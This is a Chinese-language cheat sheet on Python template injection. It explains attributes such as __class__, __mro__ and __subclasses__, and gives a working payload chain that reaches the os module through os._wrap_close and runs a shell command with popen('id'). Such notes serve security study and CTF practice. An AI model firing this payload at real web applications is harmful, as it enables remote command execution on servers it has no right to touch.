### 内置属性

*  `__class__`  返回类型所属的对象（类）
* `__mro__`       返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析
*  `__base__`    返回该对象所继承的基类
* `__subclasses__`
  每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
* `__init__`     类的初始化方法
* `__globals__`  对包含函数全局变量的字典的引用

### 内置类
Python 内置类型，继承自 `object`

| **对象**                  | **示例代码**                                        | **等效链**                       |
| ----------------------- | ----------------------------------------------- | ----------------------------- |
| **空元组 `tuple ()`**      | `().__class__.__mro__[1].__subclasses__()...`   | `tuple → object → subclasses` |
| **空字符串 `str "" or ''`** | `"".__class__.__mro__[1].__subclasses__()...`   | `str → object → subclasses`   |
| **空列表 `list []`**       | `[].__class__.__mro__[1].__subclasses__()...`   | `list → object → subclasses`  |
| **空字典 `dict {}`**       | `{}.__class__.__mro__[1].__subclasses__()...`   | `dict → object → subclasses`  |
| **数字 `int 1`**          | `(1).__class__.__mro__[1].__subclasses__()...`  | `int → object → subclasses`   |
| **布尔值 `bool True`**     | `True.__class__.__mro__[1].__subclasses__()...` | `bool → object → subclasses`  |
### Chains
#### `os`

```
{{ 
''.__class__.__mro__[1]                # 获取object基类
.__subclasses__()[128]                 # 找到os._wrap_close类（索引可能变化）
.__init__.__globals__['os']            # 获取os模块
.popen('id').read()                    # 执行命令并读取结果
}}
```
*路径：*
`'' → str → object → subclasses() → os._wrap_close → os → popen`
详解：
获得object基类后使用`__subclasses__()`返回所有直接继承自 `object` 的类的列表，其中有诸如`<class 'os._AddedDllDirectory'>,<class 'os._wrap_close'>`继承了`os`模块的类。
获取`<class 'os._wrap_close'>`后进行`__init__.__globals__`获取指向 `os` 模块的全局变量，也就是成功访问到了`os`模块并可以调用其内置函数，诸如：`os.system()，os.popen()，os.execve()`进行命令执行。
